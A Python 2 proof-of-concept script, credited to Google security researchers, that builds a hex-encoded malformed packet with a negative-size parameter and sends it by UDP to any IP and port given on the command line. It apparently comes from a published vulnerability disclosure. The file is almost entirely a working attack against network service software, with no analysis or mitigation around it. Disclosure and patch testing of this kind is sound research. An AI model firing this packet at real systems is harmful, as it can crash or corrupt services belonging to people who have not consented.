#!/usr/bin/python
#
# Copyright 2017 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors:
#  Fermin J. Serna <fjserna@google.com>
#  Felix Wilhelm <fwilhelm@google.com>
#  Gabriel Campana <gbrl@google.com>
#  Kevin Hamacher <hamacher@google.com>
#  Gynvael Coldwin <gynvael@google.com>
#  Ron Bowes - Xoogler :/

import socket
import sys

def negative_size_param():
  data = '''00 00 00 00  00 00 00 00 00 00 00 04
00 00 29 00 00 3a 00 00  00 01 13 fe 32 01 13 79
00 00 00 00 00 00 00 01  00 00 00 61 00 08 08 08
08 08 08 08 08 08 08 08  08 08 08 00 00 00 00 00
00 00 00 6f 29 fb ff ff  ff 00 00 00 00 00 00 00
00 00 03 00 00 00 00 00  00 00 00 02 8d 00 00 00
f9 00 00 00 00 00 00 00  00 00 00 00 5c 00 00 00
01 ff ff 00 35 13 01 0d  06 1b 00 00 00 00 00 00
00 00 00 00 00 04 00 00  29 00 00 3a 00 00 00 01
13 00 08 01 00 00 00 00  00 00 01 00 00 00 61 00
08 08 08 08 08 08 08 08  08 13 08 08 08 00 00 00
00 00 00 00 00 00 6f 29  fb ff ff ff 00 29 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 02 8d 00 00 00 f9  00 00 00 00 00 00 00 00
00 00 00 00 00 01 00 00  00 00 00 00 01 ff ff 00
35 13 00 00 00 00 00 b6  00 00 13 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  00 00 00 00 00 00 61 05
01 20 00 01
'''.replace(' ', '').replace('\n', '').decode('hex')
  return data

if __name__ == '__main__':
  if len(sys.argv) != 3:
    print 'Usage: %s <ip> <port>' % sys.argv[0]
    sys.exit(0)

  ip = sys.argv[1]
  port = int(sys.argv[2])

  packet = negative_size_param()

  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.setsockopt(socket.SOL_SOCKET,socket.SO_BROADCAST, 1)
  s.sendto(packet, (ip, port))
  s.close()
